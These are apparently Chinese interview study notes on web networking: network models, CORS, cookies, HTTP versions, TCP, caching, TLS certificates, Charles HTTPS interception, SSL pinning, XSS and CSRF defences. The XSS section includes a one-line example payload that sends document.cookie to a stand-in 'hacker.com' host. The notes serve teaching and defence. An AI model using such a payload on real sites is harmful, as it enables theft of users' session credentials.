#### 五层网络模型

| **层次**                | **主要协议/设备**          | **主要功能**                          |
| --------------------- | -------------------- | --------------------------------- |
| **应用层 (Application)** | HTTP, DNS, SMTP, FTP | 负责处理特定的应用程序细节，为用户提供网络服务。          |
| **传输层 (Transport)**   | TCP, UDP             | 提供进程间的通信（端口），负责数据的可靠传输或快速传输。      |
| **网络层 (Network)**     | IP, ICMP, 路由器        | 负责数据包的路由和转发，确定数据传输的路径（IP 地址）。     |
| **数据链路层 (Data Link)** | Ethernet, PPP, 交换机   | 负责物理地址寻址（MAC 地址），将数据封装成帧，提供点对点传输。 |
| **物理层 (Physical)**    | 网线, 光纤, 集线器          | 负责比特流的传输，规定电压、接口标准等。              |

#### 七层网络模型

口诀：**物 数 网 传 会 表 应**

| **应用层 (Application)**  | 提供用户接口，实现特定网络服务。       |
| ---------------------- | ---------------------- |
| **表示层 (Presentation)** | 数据格式转换、加密解密、压缩解压缩。     |
| **会话层 (Session)**      | 建立、管理和终止会话（如同步通信）。     |
| **传输层 (Transport)**    | **(同五层)** 进程间通信，可靠性保障。 |
| **网络层 (Network)**      | **(同五层)** 路由寻址，数据包转发。  |
| **数据链路层 (Data Link)**  | **(同五层)** 帧的传输，MAC 寻址。 |
| **物理层 (Physical)**     | **(同五层)** 比特流传输。       |

#### 什么是跨域 (CORS)

**CORS (Cross-Origin Resource Sharing)**，即“跨源资源共享”。

- **本质：** 它是一套 **HTTP Header 机制**，由浏览器和服务器共同协作，决定是否允许跨域请求。

- **起因：** 浏览器为了安全，实行了**同源策略 (SOP)**。默认情况下，如果 A 域名的脚本请求 B 域名的接口，浏览器会拦截返回的结果。

- **解决：** CORS 允许服务器在响应头里加一句 `Access-Control-Allow-Origin: A域名`。浏览器看到这个“通行证”，才会把数据放行给前端 JS。

在实战中，我们可以通过设置 `Access-Control-Max-Age`（这个字段用来指定预检请求的结果能够被缓存多长时间。） 来缓存预检结果，减少请求次数，优化性能。

追问：当你设置了 `Access-Control-Allow-Credentials: true` 时，后端的 `Access-Control-Allow-Origin` 能设置为星号 `*`吗？

不能。后果： 浏览器会直接报错，请求失败。正确做法： 服务器必须指定确定的、唯一的域名。例如：`Access-Control-Allow-Origin: https://www.your-app.com`。
**为什么有这个限制？** 这是为了**防止 CSRF 攻击**。如果允许任何网站都能带 Cookie 跨域访问你的接口，那安全防线就彻底崩塌了。浏览器强制要求你必须指明具体的“信任域名”
#### 为什么有时跨域会发两次请求（预检请求 OPTIONS）？到底在检什么？

浏览器将跨域请求分为两类：**简单请求** 和 **非简单请求**。
 ① 简单请求（直接发），如果请求满足以下所有条件：
- 方法是：`GET`、`POST`、`HEAD`。
- Header 只有最基本的：`Accept`、`Content-Type`（仅限 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded`）等。

② 非简单请求（不满足简单请求）浏览器就会触发 **OPTIONS 预检请求**：

**OPTIONS 的目的**是询问服务器：当前请求源是否被允许？所使用的 HTTP 方法和 Header 是否合法？只有预检通过，浏览器才会发送真实的业务请求。这样做的核心是为了**保护服务器免受非预期跨域请求的影响**（特别是那些具有写操作的请求）。

#### Cookie 如何实现http状态管理

**Cookie** 是一种在客户端（浏览器）存储少量数据的机制。它主要用于在无状态的 HTTP 协议中实现**状态管理**。

- **工作机制：**
  
  1. 服务器在 HTTP 响应头中通过 `Set-Cookie` 字段将数据发送给浏览器。
  
  2. 浏览器将这些数据以键值对的形式存储起来。
  
  3. 之后浏览器向同一域名发送请求时，会在请求头中自动带上 `Cookie` 字段发送给服务器。

- **主要用途：**
  
  - **会话管理：** 存储用户登录状态、购物车内容等。
  
  - **个性化：** 存储用户偏好设置、主题等。
  
  - **追踪：** 记录用户行为，用于分析和广告。

- **重要安全属性：**
  
  - `HttpOnly`: 阻止 JavaScript 通过 `document.cookie` 访问 Cookie，防止 XSS 攻击。
  
  - `Secure`: 仅在 HTTPS 连接中发送 Cookie。
  
  - `SameSite`: 用于防止 CSRF 攻击，限制 Cookie 跨站发送。

  - Domain: 设置cookie生效的域名

#### 对比 http1.0 1.1 2.0 https

**HTTPS 补充：** HTTPS 是在 HTTP 层和 TCP 层之间插入 **TLS/SSL (安全传输层协议)** 的产物。

- **核心作用：** 提供**数据加密、身份认证和数据完整性**。

- **加密方式：** 采用**混合加密**机制，利用**非对称加密**（证书）进行身份认证和密钥交换，利用**对称加密**对后续数据进行高效加密传输。

1.0：**非持久连接**，每次请求/响应后关闭 TCP 连接；频繁建立/关闭 TCP 连接

1.1：**持久连接**，TCP 连接默认保持打开，可复用。支持 `PUT`, `DELETE` 等更多方法；支持 `Content-Range`、`Cache-Control` 等header，cookie增加了属性；仍有 **队头阻塞**

2.0：**多路复用**，单个 TCP 连接上同时处理多个请求和响应，消除了队头阻塞；**支持头部压缩**，减少头部大小；**支持服务端推送**；但基于TCP的队头阻塞仍存在，HTTP/2 在网络质量差、丢包率高的情况下，性能可能比 HTTP/1.1 更差，因为 HTTP/1.1 至少可以通过多个连接（尽管数量有限）来分散风险

HTTP/3 放弃了 TCP，转而使用 **QUIC 协议**，而 QUIC 是基于 **UDP** 实现的

大多数现代浏览器（Chrome, Firefox, Edge）对**同一个域名 (Host)** 的最大并发 TCP 连接数限制在 **6 到 8 个**之间，针对1.1这个问题很明显

#### <mark>TCP协议</mark>

TCP 是传输层最重要的协议之一，它提供**面向连接的、可靠的、基于字节流**的通信服务。

- **面向连接：** 数据传输前需要经过**三次握手**建立连接，传输结束后需要经过**四次挥手**释放连接。

- **可靠性：**
  
  - **序号 (Sequence Number) 与确认号 (Acknowledgment Number)：** 保证数据包按序到达，并对收到的数据进行确认。
  
  - **重传机制：** 发送方在收到确认前，会重传数据。
  
  - **校验和：** 检查数据在传输过程中是否被损坏。

- **流量控制：** 利用**滑动窗口**机制，控制发送方的发送速率，防止接收方来不及处理数据而丢包。

- **拥塞控制：** 通过慢启动、拥塞避免、快重传、快恢复等机制，防止网络整体性能下降。

#### <mark>websocket：数据传输方式？状态码？怎么实现重连</mark>

WebSocket 协议建立在 HTTP 协议之上（通过 HTTP 握手）

特点

- **双向全双工通信：** 客户端和服务器可以在任何时间独立地向对方发送数据，无需等待对方的响应。

- **基于帧 (Frame) 的数据传输：** 数据以更小、开销更低的**帧**为单位进行传输，而不是像 HTTP 那样需要完整的请求和响应头，大大降低了数据传输的开销和延迟。

- **保持持久连接：** 连接一旦建立，就会一直保持打开状态，直到任意一方关闭或出现异常。

- **独立的应用层协议**（虽然基于HTTP升级），有自己的安全机制，不是依赖浏览器的同源策略。**服务器在握手阶段通过验证 Origin 来控制访问**

状态码：**成功的握手状态码：** `101 Switching Protocols`。

- 客户端发送带有 `Upgrade: websocket` 和 `Connection: Upgrade` 头的 HTTP 请求。

- 服务器如果支持，则返回 `101` 状态码，表示协议切换成功，连接正式升级为 WebSocket。

怎么实现重连：由于网络抖动、服务器重启等原因，WebSocket 连接可能中断。

1. **监听连接关闭事件：** 客户端通过监听 `WebSocket` 对象的 `onclose` 事件来检测连接中断。

2. **设置重连计时器：** 在 `onclose` 事件中，启动一个定时器。

3. **退避算法 (Backoff)：** 为了避免因网络持续中断导致客户端不断发起重连请求（**重连风暴**），应使用**指数退避**策略。
   
   - 第一次等待 1 秒，第二次等待 2 秒，第三次等待 4 秒，依此类推，直到达到最大重连次数或最大等待时间。

4. **重新发起连接：** 定时器触发后，重新创建 `WebSocket` 实例并发起连接。

#### http缓存

HTTP 缓存分为**强缓存**和**协商缓存**，浏览器会优先检查强缓存。

相关header有：
- **cache-control：**
	如果设置了 `no-store`，则跳过所有缓存，每次都重新下载。
	如果设置了 `no-cache`，则跳过强缓存，直接进入协商缓存验证。
	
- **强缓存相关header：** 浏览器直接从本地缓存读取资源，不向服务器发送请求。主要通过两个字段控制：
    - `Expires`：HTTP/1.0 产物，存储的是绝对过期时间。    
    -  cache-control 的 `max-age` 字段设置相对过期时间，优先级高于 Expires。

- **协商缓存：** 当强缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器决定是否使用缓存。
    - `Last-Modified / If-Modified-Since`：基于文件最后修改时间。缺点是秒级以内的修改无法感知。
    - `ETag / If-None-Match`：基于文件内容的 Hash 值（优先级更高），只要内容变了 ETag 就会变。

 **流程总结：** 
- **第一步：检查强缓存。** 浏览器先看 `Cache-Control` 的指令。如果命中且未过期，直接从本地读取资源，状态码为 `200 (from disk/memory cache)`。
- **第二步：触发协商缓存。** 如果强缓存失效（过期或有 `no-cache`），浏览器会携带缓存标识（`ETag` 或 `Last-Modified`）向服务器发起验证请求。
- **第三步：服务器决策。** 如果资源没变，服务器返回 `304 Not Modified`，告诉浏览器继续用旧的；如果资源变了，返回 `200` 和最新的资源。

**一般实际工程中常用的策略是：**
	 针对 HTML 页面（频繁变动）：设置 `Cache-Control: no-cache`
	 针对 静态资源（JS/CSS/图片）：配合 Webpack 打包的 **ContentHash**，设置强缓存：`Cache-Control: max-age=31536000, immutable`。
	 针对 敏感数据或私密接口：设置 `Cache-Control: no-store`。浏览器和代理服务器都不允许缓存，确保数据的安全性。
	 
总的来说，前端缓存策略的核心就是：**HTML 走协商缓存，静态资源走强缓存并配合文件名 Hash**。这样既能大幅提升加载速度，又能保证版本更新的实时性。

#### 常见的http状态码

- **2xx (成功)：** `200` 请求成功；`204` 请求处理成功但没有资源返回。
    
- **3xx (重定向)：** `301` 永久重定向（配合 SEO）；`302` 临时重定向；`304` 资源未改变，使用协商缓存。
    
- **4xx (客户端错误)：** `400` 参数错误；`401` 未授权（需登录）；`403` 服务器拒绝访问（无权限）；`404` 资源不存在。
    
- **5xx (服务器错误)：** `500` 服务器代码报错；`502` 网关错误（通常是后端服务宕机）；`504` 网关超时（后端接口响应太慢）。”

#### TCP三次握手和四次挥手的过程。为什么挥手是四次?

**三次握手（建立连接）：**

1. **客户端**发送 SYN 包，进入 SYN_SENT 状态。
    
2. **服务端**收到后，发送 SYN+ACK 包，进入 SYN_RCVD 状态。
    
3. **客户端**收到后，发送 ACK 包，双方进入 ESTABLISHED 状态。

- **核心目的：** 确认双方的**收、发能力**都是正常的。

**四次挥手（释放连接）：**

1. **客户端**发起 FIN 包，进入 FIN_WAIT_1。
    
2. **服务端**收到，先回一个 ACK 包，进入 CLOSE_WAIT（此时服务端可能还有数据没发完）。
    
3. **服务端**数据发完后，发一个 FIN 包，进入 LAST_ACK。
    
4. **客户端**收到，回一个 ACK 包，进入 TIME_WAIT，等待 2MSL 后关闭。

**为什么挥手是四次？** 这是因为 TCP 是**全双工**的。当主动方发送 FIN 只代表它不再发送数据了，但仍能接收数据。被动方收到 FIN 时，可能还有残留数据需要处理，所以先回一个 ACK（表示知道了），等自己处理完后才发送 FIN。**ACK 和 FIN 不能像握手时那样合并发送**，因此多了一次。

#### ca证书是从哪里获取的？怎么保证 CA的有效性？

**获取途径：** 网站管理员生成原始的证书请求（也就是网站自己的公钥），提交给受信任的 **CA 机构**（如 DigiCert、Let's Encrypt）。CA 机构核实身份后，用自己的**私钥**对证书的数字签名进行加密，颁发给管理员，管理员再将其部署在服务器上。

CA 证书的有效性由**信任链 (Chain of Trust)** 和**数字签名**机制来保证。

1. 浏览器/操作系统的信任列表：主流的 CA（称为**根 CA, Root CA**）的证书公钥**预装**在所有主流的操作系统和浏览器中，被标记为**受信任**的。这是信任的起点。

2. 网站将自己的**公钥**提供给 CA，CA 用自己的**私钥**对包含网站公钥和信息的证书文件进行**签名**。再将网站公钥、网站信息和这个**数字签名** 封装在一起，形成了网站的 SSL/TLS 证书。

3. 当用户访问 HTTPS 网站时，服务器会在 SSL 握手阶段主动将证书发送给浏览器。浏览器验证的网站的证书，使用 CA 的**公钥**（已预装或从信任链中获得）来**验证**这个签名。

4. 浏览器通过 CA 公钥验证了证书是真的，于是从证书里取出**网站公钥**，用公钥生成后续的对称加密密钥，服务器用私钥解密获得对称加密密钥，后续用对称密钥来进行对称加密。

总体上本质是两层非对称加密：
CA机构的一对公钥私钥，私钥用于签名，公钥给浏览器预装。
网站的密钥对：公钥给浏览器用于生成后续对称加密密钥，私钥自己用来解密生成对称加密密钥。

追问：
1.为什么不一直用网站公钥/私钥加密聊天？

- **原因 1：性能。** 非对称加密（公钥/私钥）非常消耗 CPU 资源，速度慢。如果全程用它加密，网页打开会卡死。
- **原因 2：效率。** 对称加密（AES 等）速度极快，适合传输大量数据（如 HTML、图片）。

2.加密是在数据传输的哪一步？为什么开发者工具能看到？为什么charles抓包也能看到甚至篡改？

开发者工具（Network 面板）看到的请求，是在加密发生“之前”和解密发生“之后”的。
- **黑客/路由器/运营商：** 他们在数据传输的路径上（网线、WiFi 信号、中间节点）。他们没有网站的私钥，也没有协商出来的对称密钥，所以他们抓到的包是一堆**乱码**。
- **你（开发者）：** 你在自己的机器上，拥有浏览器的最高权限，所以你看到的是**解密后**的数据。

**Charles** 或 **Fiddler** 这样的抓包工具，你会发现默认情况下它们也抓不到 HTTPS 的明文，除非你手动在电脑上安装这些工具生成的“根证书”。这本质上是进行了一次“合法的中间人攻击”。

3.加密的是什么？
HTTPS 并不是只加密你的“密码”或“数据”，它是**全方位包裹**的。
加密的内容包括：
- **Request URL** 的路径（比如 `/api/user/123`，但域名本身无法完全隐藏，因为需要 DNS 解析）。
- **HTTP Headers**（包括你的 Cookie、Authorization 令牌）。
- **HTTP Body**（表单数据、JSON 负载）。
- **Response Status Code**（比如 200、404）。

#### Charles抓包的原理

**核心原理：** Charles 拦截了浏览器和服务器之间的通话，并**分别**与两端建立了独立的加密连接。

- **步骤一（伪装成服务器）：** 当浏览器请求服务器时，Charles 截获请求，并把**自己的公钥证书**发给浏览器。
    
- **步骤二（骗取信任）：** 正常情况下，浏览器会报错“证书不可信”。但因为你手动在电脑里把 **Charles 的根证书**设为了“受信任”，浏览器就认为它是合法的。
    
- **步骤三（获取密钥）：** 浏览器用 Charles 的公钥加密了“对称密钥种子”发给 Charles，Charles 用自己的私钥解密，拿到了种子。**至此，Charles 拿到了暗号。**
    
- **步骤四（伪装成浏览器）：** Charles 拿到请求后，再自己作为客户端，去跟真正的服务器建立一套正常的 HTTPS 连接。

**结果：** 所有的请求和响应都会经过 Charles。它先用 A 钥匙解密浏览器的数据看个精光，再用 B 钥匙加密发给服务器。

Charles 抓包的前提是 **“根证书信任”** 。它通过在本地安装受信任的根证书，实现了对 HTTPS 流量的解密和重加密。

追问：如何防止被 Charles 这种工具抓包？

虽然 Charles 是开发者的利器，但在生产环境下，我们有时不希望 App 或网站被别人这样轻易抓包。这时候可以提到一个高级概念：**SSL Pinning（证书锁定）**。
**SSL Pinning 的核心思想：** 不再盲目信任系统内置的 CA 列表，而是由 App 内部**自主校验**服务器的证书。

- **原理：** 在 App 开发时，不只依赖系统的根证书信任链，而是直接在 App 代码里写死（Hardcode）服务器真实的证书信息或公钥信息。
- **效果：** 即使你在手机上安装并信任了 Charles 的根证书，App 在握手时会发现：“这张证书虽然系统说是真的，但不是我代码里写死的那张！”于是直接断开连接。
- 对比：**普通 HTTPS：** 信任系统根证书（防一般的中间人）。 **SSL Pinning：** 只信任指定证书（防本地安装恶意根证书 / 防 Charles 抓包）。

#### 如果一个网站用了 HTTPS，但它的图片资源是用 HTTP 加载的（混用内容），浏览器会报什么错？为什么这样做不安全？

这种场景可以叫做：混合内容，是指在一个通过 HTTPS 加载的页面中，包含了通过不安全的 HTTP 协议请求的资源。

**浏览器行为上**：对于 JS、CSS 等脚本资源，浏览器会为了安全直接**拦截（Block）**；对于图片、媒体等资源，会报出 **Mixed Content 警告**并导致地址栏的安全小锁消失。

**安全性上**： 第一，它破坏了**数据的机密性**，浏览器在请求 HTTP 图片时，如果该域名下有不带 `Secure` 属性的 Cookie，这些敏感的 **Session Cookie** 就会在 HTTP 请求中以**明文**形式发送。黑客截获了这张图片的请求，就等于拿到了你的登录凭证； 第二，它破坏了**数据的完整性**，中间人可以篡改 HTTP 返回的内容（如图片或脚本），实现钓鱼攻击或恶意代码注入。

因此，现代前端开发的最佳实践是全站 HTTPS，或在 HTML 头部配置 `Content-Security-Policy: upgrade-insecure-requests` 强制浏览器将 HTTP 请求自动升级为 HTTPS。

#### XSS 攻击的原理和防御

**原理：** XSS 的本质是‘**恶意代码注入**’。黑客通过在网页中注入恶意脚本（通常是 JS），当其他用户浏览该页时，浏览器执行了这些脚本，导致用户信息（如 Cookie、Token）被窃取或页面被篡改。

**主要分类：**
- **存储型：** 例如通过评论将恶意脚本存储在服务器数据库，所有访问该页面的用户都会中招。比如`<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`
- **DOM 型：** 纯前端漏洞，脚本不经过后端，而是通过改变页面的 DOM 结构触发。比如input的恶意代码，或者解析URL里的恶意代码

**防御策略：**

1. **输入过滤与转义：** 永远不要相信用户的输入。对 `<script>`、`<a>` 等标签进行过滤或 HTML 转义（将 `<` 转为 `&lt;`）。
2. **使用现代框架：** React 和 Vue 默认会自动转义变量内容，除非你显式使用 `dangerouslySetInnerHTML` 或 `v-html`。
3. **开启 CSP（内容安全策略）：** 通过 HTTP 响应头限制浏览器只能加载特定域名的资源，禁止执行内联脚本。
4. **Cookie 安全：** 给敏感 Cookie 设置 `HttpOnly` 标志，这样 JS 就无法通过 `document.cookie` 读取到它。
#### CSRF攻击的原理和防御

**原理：** CSRF 的本质是‘**利用用户的登录态发起恶意请求**’。这是利用了浏览器在处理跨站请求时的默认行为。只要请求的目标地址匹配，浏览器就会在 Header 中自动附带上本地存储的 Cookie。而浏览器的同源策略拦截的是读取而不是发送，`a.com` 默认是可以向 `b.com` 发送请求的（比如 HTML 里的 `<a>`、`<img>`、`<form>` 标签）。
浏览器的cookie原则是：跟在哪个页面发起的请求无关，只跟**请求的目标地址**有关。

黑客诱导用户访问第三方恶意网站，在用户不知情的情况下，冒充用户向原服务器发送请求（如转账、修改密码）。
**核心特征：** 攻击发生在第三方域，黑客**拿不到** Cookie 的具体内容，但能**利用** Cookie 绕过身份验证。这也是为什么点击钓鱼网站很危险的原因之一。

**防御策略：**

1. 设置严格的**SameSite （Cookie 字段属性）：** 现代浏览器支持将 Cookie 设置为 `SameSite=Strict` 或 `Lax`，限制 Cookie 在跨站请求时被携带。这是目前最简单高效的方案。
2. **CSRF Token 校验：** 服务器生成一个随机生成的 Token 给前端，前端在发送‘写’请求（POST/PUT）时必须在 Header 或 Body 中携带这个 Token。黑客在第三方域无法获取这个 Token，请求就会失败。
3. **验证 Referer / Origin 头部：** 服务器检查请求来源是否为可信域名。
4. **二次验证：** 敏感操作（如大额转账）要求用户输入支付密码或短信验证码。

追问：有了 HTTPS 还需要防范 CSRF 吗？

**需要。** 因为 HTTPS 和 CSRF 解决的是不同层面的安全问题：
- **HTTPS 解决的是‘传输安全’**：防止数据在路途中被窃听或篡改（防中间人）。
- **CSRF 解决的是‘身份利用’**：即使传输过程是加密的，黑客依然可以诱导浏览器发起一个指向服务器的‘合法加密请求’。
